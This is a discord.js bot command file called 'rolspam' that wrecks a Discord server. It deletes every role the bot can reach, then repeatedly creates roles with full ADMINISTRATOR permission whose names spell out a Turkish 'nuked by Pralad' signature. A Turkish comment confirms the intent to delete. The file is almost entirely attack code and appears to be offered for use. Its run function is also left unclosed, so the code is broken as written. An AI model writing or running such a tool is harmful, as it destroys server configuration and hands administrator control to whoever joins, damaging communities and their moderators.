const Discord = require('discord.js');
exports.run = async (client, msg, args) => {
  
  await msg.guild.roles.cache.forEach(roles => roles.delete()); //BOTUN SILE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
 
    msg.delete();
    msg.guild.roles.create({
      data: {
      name: "Pralad",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
      }
      });
        msg.guild.roles.create({
          data: {
      name: "Tarafından",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
          }
          });
            msg.guild.roles.create({
              data: {
      name: "Teklendi",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
              }
          });
        msg.guild.roles.create({
      data: {
      name: "Pralad",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
      }
      });
        msg.guild.roles.create({
          data: {
      name: "Tarafından",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
          }
          });
            msg.guild.roles.create({
              data: {
      name: "Teklendi",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
              }
              });
    msg.guild.roles.create({
      data: {
      name: "Pralad",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
      }
      });
        msg.guild.roles.create({
          data: {
      name: "Tarafından",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
          }
          });
            msg.guild.roles.create({
              data: {
      name: "Teklendi",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
              }
          });
    msg.guild.roles.create({
      data: {
      name: "Pralad",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
      }
      });
        msg.guild.roles.create({
          data: {
      name: "Tarafından",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
          }
          });
            msg.guild.roles.create({
              data: {
      name: "Teklendi",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
              }
          });
    msg.guild.roles.create({
      data: {
      name: "Pralad",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
      }
      });
        msg.guild.roles.create({
          data: {
      name: "Tarafından",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
          }
          });
            msg.guild.roles.create({
              data: {
      name: "Teklendi",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
              }
          });
    msg.guild.roles.create({
      data: {
      name: "Pralad",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
      }
      });
        msg.guild.roles.create({
          data: {
      name: "Tarafından",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
          }
          });
            msg.guild.roles.create({
              data: {
      name: "Teklendi",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
              }
          });
    msg.guild.roles.create({
      data: {
      name: "Pralad",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
      }
      });
        msg.guild.roles.create({
          data: {
      name: "Tarafından",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
          }
          });
            msg.guild.roles.create({
              data: {
      name: "Teklendi",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
              }
          });

exports.conf = {
  enabled: true, 
  guildOnly: false, 
  aliases: [],
  permLevel: 4 
};

exports.help = {
  name: 'rolspam',
  description: 'rolspam',
  usage: 'rolspam'
};